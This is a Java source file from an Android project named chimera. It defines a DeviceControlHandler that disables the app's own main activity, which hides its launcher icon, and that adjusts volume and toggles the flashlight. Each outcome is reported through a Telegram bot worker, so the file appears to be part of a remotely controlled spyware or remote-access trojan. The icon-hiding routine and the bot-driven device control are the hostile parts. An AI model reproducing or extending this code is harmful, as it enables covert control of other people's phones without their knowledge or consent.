package com.chimera;

import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraManager;
import android.media.AudioManager;

public class DeviceControlHandler {
    
    private static String flashlightCameraId = null;

    public static void setComponentState(Context context, boolean enabled) {
        PackageManager pm = context.getPackageManager();
        ComponentName componentName = new ComponentName(context, MainActivity.class);
        int state = enabled ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
        pm.setComponentEnabledSetting(componentName, state, PackageManager.DONT_KILL_APP);
    }

    public static void setMediaVolume(Context context, int level) {
        if (level < 0 || level > 100) return;
        AudioManager am = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
        int maxVolume = am.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
        int targetVolume = (int) (maxVolume * (level / 100.0));
        am.setStreamVolume(AudioManager.STREAM_MUSIC, targetVolume, 0);
    }

    public static void setFlashlightState(Context context, boolean enable) {
        try {
            CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
            if (flashlightCameraId == null) {
                for (String id : manager.getCameraIdList()) {
                    CameraCharacteristics characteristics = manager.getCameraCharacteristics(id);
                    if (characteristics.get(CameraCharacteristics.FLASH_INFO_AVAILABLE)) {
                        flashlightCameraId = id;
                        break;
                    }
                }
            }
            if (flashlightCameraId != null) {
                manager.setTorchMode(flashlightCameraId, enable);
                TelegramBotWorker.sendMessage("Flashlight has been " + (enable ? "ENABLED" : "DISABLED") + ".", context);
            } else {
                TelegramBotWorker.sendMessage("Device does not have a flashlight.", context);
            }
        } catch (CameraAccessException e) {
            TelegramBotWorker.sendMessage("Failed to access camera for flashlight.", context);
            ErrorLogger.logError(context, "Flashlight", e);
        }
    }
}